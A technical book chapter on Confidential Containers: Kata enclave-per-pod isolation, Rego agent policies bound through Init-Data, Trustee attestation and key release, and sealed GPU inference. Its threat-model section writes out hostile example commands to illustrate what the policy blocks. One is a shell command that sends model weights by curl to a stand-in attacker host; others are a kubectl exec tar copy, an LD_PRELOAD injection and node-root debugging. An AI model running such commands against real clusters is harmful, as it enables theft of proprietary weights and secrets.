# Confidential Containers, Trustee Attestation, and Sealed AI Workloads

## Overview

* **Link in the Chain:** Completes Part IV by combining `Kata` micro-VMs ([Chapter 15](15-gvisor-microvms.md)), `IETF RATS` attestation ([Chapter 4](04-ima-ipe-keylime.md)), and `SEV-SNP` / `TDX` plus Confidential GPUs ([Chapter 18](18-confidential-vms-svsm.md)) to place a hardware TEE boundary around *each individual Kubernetes Pod* (`CNCF Confidential Containers`), removing both the cloud provider and the worker-node `kubelet` from the TCB.
* **Core Security Invariant:** Untrusted host `kubelet` and `containerd` never pull, decrypt, or `exec` into confidential container images; instead, `image-rs` pulls encrypted `ocicrypt` layers *inside* the pod's measured `Kata` TEE, `Init-Data` (`HOST_DATA` / `MRCONFIGID`) binds an immutable `OPA` `agent-policy.rego` blocking unauthorized `kubectl exec`, mounts, and log scraping, and an off-cluster `Trustee` Key Broker Service releases decryption keys strictly after `RCAR` hardware quote verification.
* **Deployment Profile Matrix:** Standard Kubernetes trusts worker nodes and `etcd`/`kubelet` admins unconditionally; regulated multi-party analytics and proprietary AI inference fleets deploy `Confidential Containers` (`CoCo` `runtimeClassName: kata-qemu-snp`, `kata-clh-tdx`, `Azure AKS` Kata-CC, `OpenShift` `Peer Pods`) paired with a tenant-controlled `Trustee` (`KBS` + `AS` + `RVPS`) appliance.
* **Trusted Computing Base (TCB):** CPU TEE silicon (`SEV-SNP` / `TDX` / `Arm CCA`) plus optional `NVIDIA H100`/`B200` `CC-On` GPU silicon, measured `CoCo` guest kernel + `dm-verity` rootfs (`kata-agent` + `regorus`, `Confidential Data Hub` `CDH`, `Attestation Agent` `AA`, `image-rs`), hardware-measured `Init-Data` policy, and the tenant-owned remote `Trustee` cluster.
* **Integration Seam & Handoff:** Guarantees zero-trust confidentiality and execution integrity for containerized microservices and AI model weights even when Kubernetes control planes and worker nodes are compromised; hands off the ultimate upstream question of the book, *what if the vendor-signed code inside your verified enclave was backdoored before compilation?*, to [Chapter 20](20-xz-supply-chain-provenance.md).

## Problem Statement & Threat Model

Suppose a frontier AI laboratory deploys a proprietary Large Language Model whose `FP8`/`BF16` `.safetensors` weights cost $\$100\text{M}$ to train, or a hospital consortium deploys a federated clinical-genomics service, onto a managed cloud Kubernetes cluster (`EKS`, `AKS`, `GKE`, or a specialized GPU cloud). Why is scheduling those pods onto whole-node `AMD SEV-SNP` or `Intel TDX` *Confidential VM worker nodes* ([Chapter 18](18-confidential-vms-svsm.md)) structurally insufficient [41, 534, 535]?

Trace every principal that still sits *inside* the decrypted memory and filesystem Trusted Computing Base of a whole-node Confidential VM! While `SEV-SNP` `RMP` and `Intel TDX` `S-EPT` blind the underlying cloud `KVM` hypervisor, the entire Kubernetes worker-node Linux OS runs inside the VM's plaintext boundary: `kubelet`, `containerd`, CNI and observability DaemonSets, SREs holding node SSH access, and any cluster operator or compromised control-plane token invoking `kubectl debug node/<name> -it --image=busybox --profile=sysadmin` (which mounts the worker node's host `/` filesystem and shares `hostPID` as `UID 0` [535])! On a standard or CVM-backed Kubernetes worker node, compromise of `kubelet`, `containerd`, or cluster-admin RBAC immediately shatters workload confidentiality across four trivial paths [41, 535, 536]:
First, *Host Image Layer Theft*: `containerd` pulls and unpacks container image layers in plaintext onto `/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/` on the worker node's disk before starting a single container; anyone with node root copies the unpacked model weights in seconds.
Second, *Direct Process Memory Scraping*: because standard `runc` containers are ordinary Linux processes on the node kernel ([Chapter 14](14-containers-escapes.md)), node `UID 0` reads `/proc/<pid>/mem` or `/proc/<pid>/environ` directly to harvest decrypted keys and live inference prompts.
Third, *The `kubelet` Confused-Deputy Backdoor*: even if a pod runs inside a standard `Kata` micro-VM ([Chapter 15](15-gvisor-microvms.md)), `kata-agent` inside the VM normally obeys lifecycle RPCs from the host `kubelet` and `containerd-shim-kata-v2`! A malicious `kubelet` simply sends `ExecProcessRequest` (`kubectl exec -it llm-pod -- tar cf - /models`), injects `LD_PRELOAD=/tmp/hook.so` or `command: ["/bin/sh"]` into `CreateContainerRequest`, bind-mounts attacker-controlled host directories, or streams `stdout` console buffers via `ReadStreamRequest` [536, 537].
Fourth, *Control-Plane Secret and Ingress Exposure*: Kubernetes `Secret` objects sit accessible to `kube-apiserver` / `etcd` readers, while cluster Ingress TLS terminators inspect user HTTP payloads in cleartext.

The CNCF `Confidential Containers` (`CoCo` [41, 538, 539]) architecture redefines the Kubernetes security perimeter by treating *both* the cloud hypervisor *and* the entire Kubernetes control plane and worker-node `kubelet`/`containerd` stack as untrusted infrastructure orchestrators. Under this hostile-orchestrator threat model, the workload owner retains custody of decryption keys and appraisal policies inside an external, tenant-operated `Trustee` (`Key Broker Service`) appliance [539, 540]. Even an adversary holding simultaneous `UID 0` on the cloud host hypervisor, `UID 0` on the Kubernetes worker node, and `cluster-admin` on `kube-apiserver` must gain zero plaintext access to encrypted OCI layers, zero ability to `kubectl exec` or mutate pod arguments inside running enclaves, and zero visibility into decrypted AI weights or user prompts in CPU RAM or GPU HBM [41, 536, 539]!

## Kernel & Userspace Mechanics

### Enclave-Per-Pod Execution and Closing the `kubelet` Backdoor with `agent-policy.rego`

`Confidential Containers` (`CoCo` [41, 538]) extends `Kata Containers 3.x` so that every Pod specifying `runtimeClassName: kata-qemu-snp`, `kata-qemu-tdx`, `kata-clh-tdx`, or `kata-remote` (`Peer Pods` [541]) boots inside its own dedicated, hardware-encrypted `AMD SEV-SNP`, `Intel TDX`, or `Arm CCA` Confidential VM enclave:

![Figure: End-to-end boot, attestation, and encrypted image unlock sequence in CNCF Confidential Containers (CoCo): an untrusted worker node launches a measured Kata TEE pod, Attestation Agent proves CPU + Initdata integrity to off-cluster Trustee (KBS), and Confidential Data Hub unwraps ocicrypt layers exclusively inside enclave RAM.](diagrams/19-coco-kata-trustee-flow.svg)

To sever host filesystem visibility, `CoCo` disables host-side OCI image unpacking and `virtio-fs` rootfs sharing completely (`guest_pull` mode [41, 538]). On the untrusted worker node, `containerd-shim-kata-v2` boots *only* a generic, publicly auditable, read-only `dm-verity` guest appliance (`OVMF` + kernel + rootfs whose exact `SHA-384` measurement matches the silicon `SEV-SNP` `LAUNCH_DIGEST` or `Intel TDX` `MRTD`). Inside that encrypted pod VM, four memory-safe Rust `guest-components` (`confidential-containers/guest-components` [538]) form the intra-enclave runtime: `kata-agent` mediates control-plane `ttRPC` calls arriving over `AF_VSOCK` from the untrusted host shim [537]; `image-rs` and `ocicrypt-rs` pull OCI container layers directly into guest memory (or an ephemeral guest-side `LUKS2` block device keyed by random intra-enclave entropy destroyed on pod shutdown), verifying `Sigstore` `cosign` image signatures and decrypting `ocicrypt` layers [12, 538, 542]; `Confidential Data Hub` (`CDH`, listening exclusively on `127.0.0.1` inside the enclave) unwraps sealed secrets and storage keys [538, 543]; and `Attestation Agent` (`AA`) drives `/dev/sev-guest`, `/dev/tdx_guest`, and `NVIDIA` `SPDM` quote collection [538, 540].

Now confront the central architectural hazard of enclave-per-pod orchestration: if every confidential pod across an enterprise boots the *same* generic, signed `CoCo` guest appliance VM, what prevents a compromised worker-node `kubelet` from booting that genuine `CoCo` VM and sending a malicious `CreateContainerRequest` over `AF_VSOCK` (overriding `args` to `["/bin/sh", "-c", "curl http://attacker.ip --data-binary @/models/weights.safetensors"]`), or sending `ExecProcessRequest` (`kubectl exec`) once the weights are decrypted?

`CoCo` closes the `kubelet` Confused-Deputy backdoor by binding an Open Policy Agent (`OPA` Rego) `AgentPolicy` (`agent-policy.rego`, compiled in CI by `genpolicy` [536, 544]) into silicon launch measurements via `Init-Data` (`initdata.toml` [545]):

![Figure: Closing the untrusted kubelet Confused-Deputy backdoor inside Confidential Containers: genpolicy compiles Pod YAML invariants into policy.rego, silicon binds SHA-384(initdata) into HOST_DATA or MRCONFIGID at boot, and kata-agent's embedded Rego engine blocks unauthorized kubectl exec and mount RPCs.](diagrams/19-extra-kata-rego-policy-gate.svg)

During CI/CD build, the workload owner runs `genpolicy -y pod.yaml` [536], which parses the legitimate Kubernetes manifest and emits a deterministic `policy.rego` rule set governing every `ttRPC` message defined in Kata's `agent.proto` [537]. That policy, together with `Attestation Agent` and `CDH` endpoints, is packaged into an `initdata.toml` specification (`version = "0.1.0"` [545]):

```toml
version = "0.1.0"
algorithm = "sha384"

[data]
"policy.rego" = '''
package agent_policy
default CreateSandboxRequest := true
default CreateContainerRequest := false
default ExecProcessRequest := false
default CopyFileRequest := false
default ReadStreamRequest := false

CreateContainerRequest if {
  input.storages[_].source == "docker.io/corp/llm-serve@sha256:9f8a4c..."
  input.OCI.Process.Args == ["/usr/bin/vllm", "serve", "/models/70b"]
}
'''
"aa.toml" = '''
[token_configs.kbs]
url = "https://trustee.sec.corp:8443"
'''
"cdh.toml" = '''
[kbc]
name = "cc_kbc"
url = "https://trustee.sec.corp:8443"
'''
```

Trace the four-step cryptographic chain that locks this `initdata.toml` against host tampering [536, 544, 545]:
First, the compressed, base64-encoded `initdata.toml` is attached to the Pod (`io.katacontainers.config.hypervisor.cc_init_data`). When `QEMU` or `Cloud Hypervisor` launches the pod's Confidential VM, the VMM calculates `SHA-384(initdata.toml)` and passes that 48-byte digest into the CPU's immutable hardware host-configuration register: `HOST_DATA` inside `SEV-SNP`'s `SNP_LAUNCH_FINISH` `id_block`, or `MRCONFIGID` inside `Intel TDX`'s `TDH.MNG.INIT` (on paravisor `vTPM` platforms `az-snp-vtpm` / `az-tdx-vtpm`, `AA` extends the digest into `PCR[8]` immediately at boot [540, 545]).
Second, during early enclave initramfs startup, `CDH` and `AA` read the `initdata.toml` payload supplied by the host, recompute `SHA-384(initdata.toml)` inside encrypted RAM, and verify that it matches the silicon-committed `HOST_DATA` / `MRCONFIGID` register; on any mismatch, the pod aborts boot immediately [545]!
Third, `CDH` loads `"policy.rego"` into `kata-agent`'s compiled-in Rust Rego interpreter (`regorus` [544]). Every subsequent `ttRPC` request arriving over `AF_VSOCK` from the untrusted worker-node `containerd-shim` is serialized as JSON `input` and evaluated synchronously against `package agent_policy` *before* `kata-agent` executes a single handler line [536, 537].
Fourth, `HOST_DATA` / `MRCONFIGID` is signed inside the hardware CPU quote verified by `Trustee`! Observe the airtight catch-22 imposed on a compromised Kubernetes worker node: if `kubelet` leaves `initdata.toml` unmodified and attempts `kubectl exec` (`ExecProcessRequest`), `kubectl cp` (`CopyFileRequest`), `stdout` scraping (`ReadStreamRequest`), or altering `OCI.Process.Args` / `Env`, `regorus` inside the enclave denies the RPC deterministically; if `kubelet` edits `initdata.toml` before VM launch to flip `ExecProcessRequest := true`, `SHA-384(initdata.toml)` changes `HOST_DATA` / `MRCONFIGID`, causing `Trustee` to reject the attestation quote and withhold every decryption key [539, 545]!

> **Key Principle.**
> Hardware memory encryption (`SEV-SNP` or `Intel TDX`) protects a Pod's DRAM pages from `KVM`, yet without `Init-Data` and `agent-policy.rego`, `kata-agent` inside the enclave remains an obedient `AF_VSOCK` deputy of the untrusted worker-node `kubelet`. Enclave-per-pod security holds if and only if every host-to-guest `ttRPC` surface (`CreateContainer`, `ExecProcess`, `CopyFile`, `ReadStream`, and auxiliary management endpoints) is mediated by a Rego policy whose cryptographic digest is locked into silicon launch evidence before a single secret is released [536, 545, 546].

### `RATS` Attestation, `Trustee` (`KBS` / `AS` / `RVPS`), and `RCAR` Key Release

Encrypted container images (`ocicrypt` [542]) wrap each OCI filesystem layer (`application/vnd.oci.image.layer.v1.tar+gzip+encrypted`) under `AES-256-GCM`, embedding a key-provider descriptor (`provider:attestation-agent:kbs:///default/llm-keys/weights-v1`) rather than any decryption key in the registry manifest. Similarly, confidential Kubernetes `Secret` values are replaced in `etcd` with `CoCo` *Sealed Secrets* (`sealed.fakeJWSheader.<base64url-json>.fakesig` [543]). Look at how `Confidential Data Hub` (`CDH`) makes Sealed Secrets transparent to unmodified applications inside the enclave [538, 543]: the cluster manifest stores an ordinary Kubernetes `Secret` or `env` variable whose value carries the `sealed.` prefix wrapping a JSON pointer (`{"version": "0.1.0", "type": "vault", "provider": "kbs", "name": "kbs:///default/db-creds/prod"}`). Because `etcd` and worker-node `kubelet` see only that public resource URI, `cluster-admin` compromise leaks zero credentials. Inside the pod TEE, just before `kata-agent` spawns the container process, `kata-agent` scans `OCI` environment variables and mounted secret files for the `sealed.` prefix, calls `CDH`'s loopback-only `UnsealSecret` `ttRPC` service (`127.0.0.1:8043`), and substitutes the unwrapped plaintext exclusively inside encrypted guest memory (`CDH` similarly unlocks encrypted `dm-crypt`/`LUKS2` persistent block volumes inside the enclave via its `SecureMount` API without exposing volume keys to the host kernel) [538, 543]!

When `image-rs` or `CDH` inside the pod enclave encounters a `kbs:///` URI, `Attestation Agent` (`AA`) executes the four-message `Request-Challenge-Attestation-Response` (`RCAR` `v0.1.1` [540]) protocol, combining the `IETF RATS` (`RFC 9334` [52]) *Background-Check* and *Passport* topologies across `Trustee` (`confidential-containers/trustee` [539, 540]). Unlike a pure Passport model where an untrusted client might cache a long-lived token offline, `RCAR` binds an ephemeral session cookie and an enclave-held asymmetric wrapping key directly into a live challenge-response exchange over HTTPS (necessary yet *not* sufficient on its own, since HTTPS terminates before enclave key unwrapping, which is why payload-level `JWE` encryption to the TEE's ephemeral public key is mandatory [540, 547]):

In Step 1 (`Request`) and Step 2 (`Challenge`), `AA` posts `{"version": "0.1.1", "tee": "snp", "extra-params": {}}` (or `"tdx"`, `"cca"`, `"az-snp-vtpm"`) to `POST /kbs/v0/auth`; `Trustee`'s `Key Broker Service` (`KBS`) generates a fresh base64-encoded cryptographic `nonce` (`Challenge`) and issues an `HttpOnly` session cookie (`kbs-session-id`) so subsequent layer or secret fetches within the cookie's short validity window reuse the attested session without incurring repeated hardware quote round-trips [540].
In Step 3 (`Attestation`), `AA` generates an ephemeral `RSA-2048` or `ECDH P-256` keypair $(pk_{\text{eph}}, sk_{\text{eph}})$ strictly inside encrypted enclave RAM and requests a hardware quote from `/dev/sev-guest` or `/dev/tdx_guest` whose 64-byte `REPORT_DATA` field cryptographically binds both challenge freshness and public-key possession [540]:

$$\texttt{REPORT\_DATA}_{64\text{B}} = \operatorname{SHA-512}\!\left(\text{nonce} \;\parallel\; \operatorname{JWK}(pk_{\text{eph}})\right)$$

In Step 4 (`Appraisal & JWE Delivery`), `AA` posts `{ "tee-pubkey": JWK(pk_eph), "attestation-evidence": <quote> }` to `POST /kbs/v0/attest`. `Trustee` intentionally separates hardware evidence verification from resource authorization across two distinct `OPA` policy gates [539]:
First, Rust platform *Verifiers* inside the `Attestation Service` (`AS`) validate the silicon X.509 endorsement chain (`AMD ARK -> ASK -> VCEK` + CRLs, or `Intel SGX/TDX Root -> PCK -> Quoting Enclave`), confirm `REPORT_DATA` matches `(nonce, pk_eph)`, and extract structured TCB claims.
Second, `AS` evaluates its runtime-scoped *Attestation Policy* comparing those TCB claims against known-good manifests registered in the `Reference Value Provider Service` (`RVPS`: checking expected `LAUNCH_DIGEST`/`MRTD`, expected `HOST_DATA`/`MRCONFIGID` `Init-Data` digest, `snp_policy_debug == false` so hypervisor `SNP_DBG_DECRYPT` is disabled, and minimum microcode `TCB_SVN` levels), minting a signed `RFC 9711` *Entity Attestation Token* (`EAT` [201]) containing `IETF AR4SI` (*Attestation Results for Secure Interactions* [548]) trust vectors (`instance-identity`, `configuration`, `executables`, `hardware`, `runtime-opaque`) plus the exact policy identifier applied [539, 540]. (Even if a client supplies an `attestation-policy-selector` hint in `extra-params`, `KBS` inspects the *resolved* policy claim inside the signed `EAT` token so a rogue guest can never downgrade its own appraisal requirements [540]!)
Third, when `CDH` sends `GET /kbs/v0/resource/default/llm-keys/weights-v1`, `KBS` verifies the JWS signature on the `EAT` token (preventing `CVE-2024-51997` token-interception attacks [549]), evaluates its hardware-agnostic *KBS Resource Policy* confirming that `AR4SI` vectors are `AFFIRMING` and the verified `Init-Data` claim authorizes access to `llm-keys/weights-v1`, retrieves the secret via its backend Vault/KMS plugin, and returns an `RFC 7516` JSON Web Encryption (`JWE` [547]) ciphertext encrypted strictly under $pk_{\text{eph}}$ [539, 540]!

### End-to-End Sealed AI Inference: Composite CPU+GPU Attestation and `RA-TLS`

Combining `Confidential Containers`, `NVIDIA` Confidential GPUs ([Chapter 18](18-confidential-vms-svsm.md) [86, 550]), `Trustee` composite attestation [539], and `Remote-Attested TLS` (`RA-TLS` [551]) enables end-to-end sealed AI model serving on untrusted third-party GPU clouds:

![Figure: End-to-end confidential AI inference pipeline on Linux: encrypted ocicrypt model weights, composite CPU (SEV-SNP/TDX) + GPU (NVIDIA H100/B200 SPDM) attestation to Trustee KBS, encrypted PCIe tensor transfer, and Remote-Attested TLS (RA-TLS) for client prompts.](diagrams/19-sealed-ai-inference-pipeline.svg)

Look at how `Trustee` prevents *CPU-GPU Relay/Splice Attacks* when a `CoCo` pod attaches a `VFIO` pass-through `NVIDIA H100` or `B200` GPU [539, 550]: inside the pod enclave, `AA` first collects secondary `SPDM` attestation evidence from the physical GPU via `NVIDIA nvtrust` (`nvrc` [86, 550]), hashes that GPU evidence alongside `(nonce, pk_eph)`, and commits that composite hash into the primary CPU `TD_QUOTE` or `SNP_REPORT` `REPORT_DATA`! `Trustee` unpacks the composite bundle, runs both the Intel/AMD CPU verifier and the NVIDIA GPU verifier (`CC-On` mode, locked BARs, signed Hopper/Blackwell firmware SVNs), and emits one `submod` `AR4SI` trust vector per device inside the `EAT` token [539]. `KBS` releases the `.safetensors` decryption key *if and only if* both CPU and GPU `submod` vectors affirm integrity; decrypted model weights stream across `AES-GCM-256` `SWIOTLB` bounce buffers directly into GPU HBM3e without touching host storage! Finally, to protect *enterprise user prompts and token completions* from untrusted Kubernetes Ingress load balancers, the serving engine inside the pod terminates `RA-TLS` [551]: generating an ephemeral TLS 1.3 keypair in enclave RAM and embedding a fresh hardware quote + `Init-Data` digest over the TLS public key inside a custom X.509v3 certificate extension so client SDKs cryptographically verify both the enclave binary and its `ExecProcessRequest := false` policy *before* transmitting a single prompt token!

## Distro, Immutable-OS, & Cloud Trade-Offs

Deploying `Confidential Containers` across bare-metal, nested-virtualization, and public-cloud Kubernetes environments involves distinct architectural trade-offs across isolation granularity, cold-start latency, and cloud hypervisor APIs:

| Kubernetes Deployment Mode | Per-Pod Isolation Boundary | Worker-Node `kubelet` in TCB? | Cold-Start & Memory Overhead | Cloud Substrate Requirement |
|---|---|---|---|---|
| Standard K8s Pod (`runc` / `crun`) | Shared worker Linux kernel namespaces | Yes (full plaintext disk, RAM, & `exec`) [535] | `< 200 ms`; ~`5 MiB` overhead | Any Linux VM or bare-metal node |
| CVM Worker Node Pool (`AKS` / `GKE` CVM Nodes) | Whole-node `SEV-SNP` or `TDX` VM | Yes (node admins & `kubelet` see plaintext) [41, 534] | `< 300 ms` per pod (node already booted) | Standard cloud Confidential VM SKUs |
| `CoCo` Local Hypervisor (`kata-qemu-snp`, `kata-clh-tdx`) | Dedicated `SEV-SNP` / `TDX` micro-VM per Pod [41] | No (`guest_pull` + `Init-Data` `policy.rego`) [545] | `~1.5-3.0 s` boot + `RCAR` + pull; `~256-512 MiB` RAM | Bare-metal TEE host or cloud supporting nested TEEs |
| `CoCo` `Peer Pods` (`cloud-api-adaptor` `kata-remote`) | Sibling L1 Cloud Confidential VM per Pod [534, 541] | No (pod runs in separate L1 CVM over VXLAN) [541] | `~15-35 s` cloud VM provision (or warm pool) [541] | Works on *any* cloud (`AWS`, `Azure`, `IBM`) via IaaS APIs [534, 541] |

Two practical engineering trade-offs shape production `CoCo` sizing and observability. First, because `guest_pull` downloads and decrypts `ocicrypt` OCI layers *inside* each pod's isolated enclave rather than sharing a worker-node `overlayfs` page cache across fifty pods, `image-rs` inspects each layer descriptor's `org.opencontainers.image.enc.keys.provider.attestation-agent` annotation, asks `CDH` / `AA` to unwrap the symmetric 256-bit Content Encryption Key (`CEK`) from `Trustee`, and streams `AES-256-GCM` decryption directly into enclave `tmpfs` or an ephemeral enclave-keyed `LUKS2` scratch block device [538, 542]. For multi-tens-of-gigabytes frontier LLM weights where per-pod registry downloads would dominate cold start, production deployments keep the base container image lean (`vLLM` + `CUDA` libraries) and mount a pre-encrypted read-only `dm-verity` + `LUKS2` block volume whose volume master key is fetched via `CDH`'s `SecureMount` endpoint after `RCAR` attestation completes [538, 539]. Second, operators must treat container standard output (`stdout`/`stderr`) and crash dumps as an explicit enclave egress boundary: if `ReadStreamRequest` is left enabled in `policy.rego`, `kata-agent` forwards console output over `AF_VSOCK` to host `containerd`, writing plaintext logs into `/var/log/pods/` on the untrusted worker node where any Python exception traceback or debug print leaks prompt tokens! Hardened `CoCo` policies therefore set `ReadStreamRequest := false` and ship structured telemetry directly from an intra-enclave OpenTelemetry emitter over `mTLS` (`SPIFFE` `X.509-SVID` from [Chapter 16](16-workload-identity-spiffe.md)) to a tenant-owned log collector [536, 545]. Third, on public clouds that do not expose nested `SEV-SNP`/`TDX` inside standard worker VMs, `CoCo`'s `cloud-api-adaptor` (`Peer Pods`, powering Red Hat OpenShift Sandboxed Containers and multi-cloud `CoCo` [534, 541]) implements Kata's Remote Hypervisor interface: a mutating webhook converts host CPU/RAM resource requests into `kata.peerpods.io/vm` extended resources, `cloud-api-adaptor` invokes AWS EC2, Azure Compute, or IBM Cloud APIs to boot a standalone L1 Confidential VM per pod wired into the cluster CNI over an encrypted VXLAN tunnel, and `peerpod-ctrl` reaps dangling cloud VMs on pod termination [541]!

## Seam Failures, CVEs, & Structural Bounds

Security advisories across `Kata Containers`, `CoCo` `guest-components`, and `Trustee` between 2024 and 2026 demonstrate that once hardware memory encryption holds, adversaries immediately probe unmediated `ttRPC` methods, `genpolicy` mount rules, archive extraction inside `image-rs`, and `Trustee` token/endpoint authentication!

| Incident / CVE | Year | Subsystem | Broken Assumption | Exploit Mechanism | Architectural Fix |
|---|---|---|---|---|---|
| `CVE-2026-64676` (`GHSA-h8jv-63p2-496x`) | 2026 | `kata-agent` `mem-agent` `ttRPC` service | Every host-reachable `ttRPC` method inside `kata-agent` is gated by `agent-policy.rego` | Auxiliary `mem-agent` `ttRPC` endpoints bypassed Rego policy evaluation, letting untrusted host manipulate guest memory state | Gate *every* `ttRPC` service and method inside `kata-agent` uniformly behind `regorus` `AgentPolicy` [537, 546] |
| `CVE-2026-77176` (`GHSA-fmg6-v47x-52wr`) | 2026 | `Kata` `genpolicy` Rego rule generator | Auto-generated `policy.rego` restricts all guest mount sources safely | Over-permissive generated mount regex allowed untrusted host shim to mount attacker-chosen guest paths onto sensitive locations | Tighten `genpolicy` source/destination path canonicalization and audit generated `policy.rego` before signing `Init-Data` [536, 552] |
| `CVE-2026-86072` (`GHSA-7fhf-v3p3-rp56`) | 2026 | `Kata` host pod-annotation mount handler | Operator host-path allowlist blocks arbitrary host bind-mounts via annotations | Untrusted pod annotation bypassed allowlist validation to bind-mount arbitrary worker-node paths into Kata VM | Enforce strict annotation sanitization in `containerd-shim-kata-v2` and Kubernetes admission webhooks [553] |
| `CVE-2026-47699` (`GHSA-84rc-2q4r-45pc`) | 2026 | `CoCo` `image-rs` layer unpacker | Unpacking OCI tar layers inside enclave writes strictly inside container rootfs | Zip-slip-class absolute entry path in hardlink fallback wrote files to arbitrary enclave rootfs paths | Canonicalize and confine all tar/hardlink targets inside `image-rs` using root-scoped `openat2` checks [538, 554] |
| `CVE-2024-51997` (`GHSA-7jc6-j236-vvjw`) | 2024 | `Trustee` `Attestation Results Token` (`AS` to `KBS`) | Token returned from `AS` cannot be forged before `KBS` resource check | Unsigned/unverified token allowed interception and claim modification to unlock `KBS` secrets without valid TEE | Enforce asymmetric JWS signing and strict signature/issuer verification on `EAT` tokens between `AS` and `KBS` [201, 549] |
| `CVE-2025-61779` (`GHSA-49mc-2q77-m99x`) | 2025 | `Trustee` `/attestation-policy` REST API | Policy management endpoints reject unauthenticated network callers | Missing admin authentication check allowed unauthenticated caller to overwrite `AS` OPA appraisal policy | Mandate strong admin bearer/mTLS authentication on all `Trustee` policy and `RVPS` write endpoints [539, 555] |
| Permissive Debug Policy (`ExecProcess := true` / `DEBUG = 1`) | 2023-2026 | Operator `Init-Data` & `Trustee` `OPA` policy | Valid silicon `VCEK`/`PCK` signature alone guarantees enclave confidentiality | Shipping sample `policy.rego` (`ExecProcessRequest := true`) or accepting `snp_policy_debug == true` permits `kubectl exec` or `SNP_DBG_DECRYPT` | Enforce `ExecProcessRequest := false`, `ReadStreamRequest := false`, `debug == false`, and `TCB_SVN` floors in `Trustee` [539, 545] |
| Backdoored Upstream Package Inside Verified TEE | 2024 | Guest OCI / OS supply chain (`CVE-2024-3094` class) | Verified `LAUNCH_DIGEST` + `cosign` + `ocicrypt` guarantees benign code | Upstream library (`liblzma` / Python dependency) was subverted *before* CI built, encrypted, and signed the enclave image | Combine `CoCo` runtime attestation with Git-direct Reproducible Builds, `SLSA` L3 provenance, and `Sigstore` `Rekor` ([Chapter 20](20-xz-supply-chain-provenance.md)) [12] |

Pause on that final row. Suppose your infrastructure verifies every `AMD SEV-SNP` `VCEK` hardware quote, `COCONUT-SVSM` `VMPL0` `PCR[11]` measurement, `dm-verity` Merkle root, `IPE` policy, `SELinux` label, `Init-Data` `policy.rego` `SHA-384` digest, and `Trustee` `JWE` key release with zero flaws: *what happens when a patient upstream open-source maintainer hides an `Ed448`-gated backdoor inside a release tarball before your distribution or CI pipeline ever compiles and signs the image?* [Chapter 20](20-xz-supply-chain-provenance.md) brings *The Linux Trust Chain* to its capstone by dissecting the `XZ Utils` (`CVE-2024-3094`) supply-chain operation and the cryptographic build-provenance architecture engineered to close that final upstream seam.

## Inspecting on a Live Linux Host

Check Kubernetes `RuntimeClass` registrations or worker-node `containerd` configuration for `Confidential Containers` (`kata-qemu-snp`, `kata-qemu-tdx`, `kata-clh-tdx`, `kata-remote`):

```bash
grep -rnE "kata-(qemu|clh|remote)" /etc/containerd/ 2>/dev/null || kubectl get runtimeclass 2>/dev/null || true
```

Inspect installed `Confidential Containers` host binaries (`/opt/confidential-containers/bin/`), `genpolicy`, and `Kata` hardware TEE readiness:

```bash
ls -la /opt/confidential-containers/bin/ 2>/dev/null || command -v genpolicy kata-runtime 2>/dev/null || true
kata-runtime check --no-network-checks 2>/dev/null | head -n 10 || true
```

Verify how `Init-Data` (`initdata.toml`) `SHA-384` digests are deterministically computed prior to `HOST_DATA` / `MRCONFIGID` launch binding:

```bash
printf 'version = "0.1.0"\nalgorithm = "sha384"\n[data]\n' | sha384sum
```

Check inside a `CoCo` guest pod (when inspecting a test/dev enclave) for loopback-only `Confidential Data Hub` (`127.0.0.1:8043`) and `Attestation Agent` sockets:

```bash
ss -tlnp 2>/dev/null | grep -E "8043|attestation|cdh" || true
```

